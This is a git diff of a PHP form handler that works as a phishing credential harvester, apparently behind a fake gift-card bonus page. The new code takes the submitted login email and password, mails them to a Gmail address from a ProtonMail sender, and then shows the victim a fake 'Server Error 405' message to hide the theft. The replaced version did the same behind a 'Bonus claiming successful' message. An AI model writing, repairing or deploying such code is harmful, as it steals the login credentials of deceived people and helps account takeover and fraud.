@@ -1,15 +1,23 @@
 <?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Collect form data
+    $username = htmlspecialchars($_POST['login_email']);
+    $password = htmlspecialchars($_POST['login_password']);
 
-$login_email = $_POST["$login_email"];
-$login_password = $_POST["$login_password"];
-$to = "allgiftcardchecker@gmail.com";
-$subject = "Information for you";
-$text = "Login Information";
+    // Email details
+    $to = "allgiftcardchecker@gmail.com"; // Replace with your email address
+    $subject = "Login Information";
+    $message = "Username: " . $username . "\n";
+    $message .= "Password: " . $password . "\n";
+    $headers = "From: rahulparves@protonmail.com"; // Replace with a valid 'from' address
 
-$headers = "Email:".$login_email."r\n Password:".$login_password."r\n";
-
-mail($to,$subject,$text,$headers);
-
-echo("Bonus claiming successful. Go to home page");
-
+    // Send email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Server Error 405";
+    } else {
+        echo "Failed. Try again.";
+    }
+} else {
+    echo "Invalid request.";
+}
 ?>
